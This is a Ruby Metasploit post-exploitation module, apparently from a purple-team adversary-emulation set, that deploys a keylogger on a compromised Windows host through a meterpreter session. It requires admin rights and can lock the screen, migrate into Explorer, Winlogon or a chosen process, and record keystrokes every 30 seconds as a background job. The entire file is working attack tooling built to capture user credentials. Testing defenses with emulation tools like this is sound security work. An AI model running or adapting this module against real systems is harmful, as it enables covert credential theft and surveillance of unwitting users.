##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Input Capture (T1056) Windows - Purple Team',
                      'Description'   => %q{
                        Collection, Credential Access:
                        Adversaries can use methods of capturing user input for obtaining credentials for Valid Accounts and information Collection that include keylogging and user input field interception.

                        Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1056' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new('MODULE', [ true, 'Module to execute', 'post/windows/capture/keylog_recorder']),
      OptBool.new('LOCKSCREEN',   [false, 'Lock system screen.', true]),
      OptBool.new('MIGRATE',      [false, 'Perform Migration.', true]),
      OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes in seconds', 30]),
      OptInt.new( 'PID',          [false, 'Process ID to migrate to', nil]),
      OptEnum.new('CAPTURE_TYPE', [false, 'Capture keystrokes for Explorer, Winlogon or PID', 'explorer', ['explorer','winlogon','pid']])
    ])
  end

  def run_module(mod)
      framework_mod = framework.modules.create(mod)
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['LOCKSCREEN'] = datastore['LOCKSCREEN']
      framework_mod.datastore['MIGRATE'] = datastore['MIGRATE']
      framework_mod.datastore['INTERVAL'] = datastore['INTERVAL']
      framework_mod.datastore['PID'] = datastore['PID']
      framework_mod.datastore['CAPTURE_TYPE'] = datastore['CAPTURE_TYPE']
      framework_mod.datastore['WORKSPACE'] = datastore['WORKSPACE'] if datastore['WORKSPACE']
      framework_mod.run_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'  => true)
  end

  def run
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"
      fail_with(Failure::NoAccess, "Module requires administrative rights.") unless is_admin?

      mod = datastore['MODULE']
      print_status("Executing '#{mod}' on #{session.inspect}")
      run_module(mod)

      # sleep so that the output isnt confusing
      Rex::sleep(3)

      print_warning("Keylogger running as background job.")
      print_good("Module T1056W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1056W execution failed.")
    end
   end
end
